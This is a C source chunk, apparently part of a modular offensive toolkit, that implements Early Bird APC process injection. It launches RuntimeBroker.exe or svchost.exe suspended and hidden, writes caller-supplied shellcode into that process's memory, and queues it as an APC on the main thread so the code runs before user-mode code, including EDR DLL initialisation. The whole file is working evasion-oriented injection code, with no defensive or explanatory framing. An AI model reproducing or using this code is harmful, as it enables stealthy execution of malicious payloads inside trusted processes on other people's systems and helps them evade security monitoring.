// chunk: arch/early_bird_apc
// depends: (none)
// provides: early_bird_inject
// headers: windows.h
// risk: medium
// note: Early Bird APC injection — creates suspended process, allocates+writes shellcode, queues APC to main thread, resumes. APC executes before any user-mode code runs, including EDR DLL init.

#ifndef CHUNK_EARLY_BIRD_APC
#define CHUNK_EARLY_BIRD_APC

typedef NTSTATUS (NTAPI *pfnNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);

static int early_bird_inject(BYTE *code, DWORD code_size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnNtQueueApcThread pNtQueueApc = (pfnNtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");
    if (!pNtQueueApc) return 0;

    // Create suspended legitimate process
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    char target[] = "C:\\Windows\\System32\\RuntimeBroker.exe";
    if (!CreateProcessA(NULL, target, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        char fallback[] = "C:\\Windows\\System32\\svchost.exe";
        if (!CreateProcessA(NULL, fallback, NULL, NULL, FALSE,
                            CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
            return 0;
    }

    // Allocate memory in target
    LPVOID remote_buf = VirtualAllocEx(pi.hProcess, NULL, code_size,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_buf) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }

    // Write code
    SIZE_T written;
    WriteProcessMemory(pi.hProcess, remote_buf, code, code_size, &written);

    // Queue APC — will execute when thread resumes (before any user code)
    pNtQueueApc(pi.hThread, remote_buf, NULL, NULL, NULL);

    // Change protection to RX
    DWORD old;
    VirtualProtectEx(pi.hProcess, remote_buf, code_size, PAGE_EXECUTE_READ, &old);

    // Resume thread — APC fires immediately
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 1;
}

#endif
